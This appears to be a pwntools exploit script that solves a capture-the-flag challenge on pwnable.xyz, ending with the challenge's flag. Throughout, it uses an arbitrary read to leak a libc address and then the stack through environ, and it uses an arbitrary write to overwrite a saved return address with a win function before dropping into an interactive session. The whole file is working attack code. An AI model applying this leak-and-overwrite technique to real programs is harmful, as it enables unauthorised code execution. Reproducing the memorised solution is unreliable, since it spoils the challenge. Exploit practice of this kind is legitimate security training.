from pwn import *
import time

LOCAL = False
libc = ELF('./alpine-libc-2.28.so')
if LOCAL:
    r = process('./challenge_patched')
else:
    r = remote('svc.pwnable.xyz', 30019)
r.sendlineafter("> ", "1") # perform a read
win = 0x400905
stdin = 0x00601020
stdin = 0x601020+216 # 0x601100 + 216, why isn't this memory readable? 
r.sendafter(": ", str(stdin))
jumps_addr = int.from_bytes(r.recvline()[:-1], byteorder='little')
print(hex(jumps_addr))

libc_offset = 0x00007ff5e52ef2a0 - 0x7ff5e4f3b000
libc_base = jumps_addr - libc_offset
print("libc base: ", hex(libc_base))
print("environ: ", hex(libc.symbols['environ']))
print("environ + libc: ", hex(libc_base + libc.symbols['environ']))


""" ret_to_environ = 0x7ffebab8f908 - 0x00007ffebab8fa28 """
""" ret_to_environ = 0x00007ffc1ffb6588 - 0x00007f07697daeae """
""" ret_to_environ =  0x00007ffda9961df8 """
""" 0x00007fff42bcbcb8 """
ret_to_environ = 0x00007fffbf700778 - 0x7fffbf700688
assert ret_to_environ > 0

r.sendlineafter("> ", "1")
r.sendafter(": ", str(libc_base + libc.symbols['environ']))
stack_environ = int.from_bytes(r.recvline()[:-1], byteorder='little')
print("stack environ: ", hex(stack_environ))
print("offset: ", hex(ret_to_environ))
to_write = stack_environ - ret_to_environ 
print("overwriting: ", hex(to_write))


r.sendlineafter("> ", "2")
r.sendafter(": ", str(to_write))

""" gdb.attach(r) """
""" time.sleep(1) """

""" r.sendafter(": ", str(0x4141414141414141)) """
r.sendafter(": ", str(win))

r.sendlineafter("> ", "0")

r.interactive()

# FLAG{__envir0n_ch3cked}[
